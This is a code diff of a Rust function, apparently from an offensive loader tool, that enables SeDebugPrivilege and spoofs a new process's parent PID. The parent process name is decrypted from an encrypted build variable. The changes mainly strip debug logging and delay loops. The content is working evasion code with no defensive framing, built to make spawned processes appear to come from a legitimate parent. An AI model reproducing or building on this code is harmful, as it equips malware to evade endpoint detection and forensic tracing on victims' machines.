@@ -244,34 +244,28 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                     tp.Privileges[0].Luid = luid;
                     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                     if AdjustTokenPrivileges(token, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut()) != 0 {
-                        #[cfg(feature = "debug")]
-                        crate::utils::print_message("SeDebugPrivilege enabled successfully");
                     } else {
                         #[cfg(feature = "debug")]
-                        crate::utils::print_message(&format!("Failed to enable SeDebugPrivilege: {}", GetLastError()));
+                        crate::utils::print_error("Error", &format!("Failed to enable SeDebugPrivilege: {}", GetLastError()));
                     }
-                    crate::utils::delay_loop();
+                    
                 } else {
                     #[cfg(feature = "debug")]
-                    crate::utils::print_message(&format!("LookupPrivilegeValueW failed: {}", GetLastError()));
-                    crate::utils::delay_loop();
+                    crate::utils::print_error("Error", &format!("LookupPrivilegeValueW failed: {}", GetLastError()));
+                    
                 }
                 CloseHandle(token);
             } else {
                 #[cfg(feature = "debug")]
-                crate::utils::print_message(&format!("OpenProcessToken failed: {}", GetLastError()));
+                crate::utils::print_error("Error", &format!("OpenProcessToken failed: {}", GetLastError()));
             }
         }
 
         use crate::utils::simple_decrypt;
         let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));
         if let Some(parent_pid) = get_process_id_by_name(&parent_name) {
-            #[cfg(feature = "debug")]
-            crate::utils::print_message(&format!("Attempting PPID spoofing with {} (PID: {})", parent_name, parent_pid));
             let parent_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, parent_pid);
             if parent_handle != 0 {
-                #[cfg(feature = "debug")]
-                crate::utils::print_message("Opened parent process handle successfully");
                 // Initialize STARTUPINFOEXW
                 let mut startup_info: STARTUPINFOEXW = std::mem::zeroed();
                 startup_info.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
@@ -286,8 +280,6 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                 let attr_list_ptr = attr_list.as_mut_ptr() as *mut core::ffi::c_void;
 
                 if InitializeProcThreadAttributeList(attr_list_ptr, 1, 0, &mut attr_size) != 0 {
-                    #[cfg(feature = "debug")]
-                    crate::utils::print_message("Initialized attribute list successfully");
                     // Set parent process attribute
                     if UpdateProcThreadAttribute(
                         attr_list_ptr,
@@ -298,8 +290,6 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                         std::ptr::null_mut(),
                         std::ptr::null_mut(),
                     ) != 0 {
-                        #[cfg(feature = "debug")]
-                        crate::utils::print_message("Set parent process attribute successfully");
                         startup_info.lpAttributeList = attr_list_ptr;
 
                         // Convert target_program to UTF-16
@@ -319,35 +309,30 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                         );
 
                         if success != FALSE {
-                            #[cfg(feature = "debug")]
-                            crate::utils::print_message("PPID spoofing successful");
-
-                            crate::utils::delay_loop();
+                            
                             DeleteProcThreadAttributeList(attr_list_ptr);
                             CloseHandle(parent_handle);
-                            crate::utils::delay_loop();
+                            
                             return Ok(process_info);
                         } else {
                             #[cfg(feature = "debug")]
-                            crate::utils::print_message(&format!("CreateProcessW failed with error: {}", GetLastError()));
+                            crate::utils::print_error("Error", &format!("CreateProcessW failed with error: {}", GetLastError()));
                         }
                     } else {
                         #[cfg(feature = "debug")]
-                        crate::utils::print_message(&format!("UpdateProcThreadAttribute failed with error: {}", GetLastError()));
+                        crate::utils::print_error("Error", &format!("UpdateProcThreadAttribute failed with error: {}", GetLastError()));
                     }
                     DeleteProcThreadAttributeList(attr_list_ptr);
                 } else {
                     #[cfg(feature = "debug")]
-                    crate::utils::print_message(&format!("InitializeProcThreadAttributeList failed with error: {}", GetLastError()));
+                    crate::utils::print_error("Error", &format!("InitializeProcThreadAttributeList failed with error: {}", GetLastError()));
                 }
                 CloseHandle(parent_handle);
             } else {
                 #[cfg(feature = "debug")]
-                crate::utils::print_message(&format!("OpenProcess failed with error: {}", GetLastError()));
+                crate::utils::print_error("Error", &format!("OpenProcess failed with error: {}", GetLastError()));
             }
         }
-        #[cfg(feature = "debug")]
-        crate::utils::print_message("PPID spoofing failed or not attempted, falling back to normal process creation");
     }
 
     // Fallback to original CreateProcessA if spoofing fails
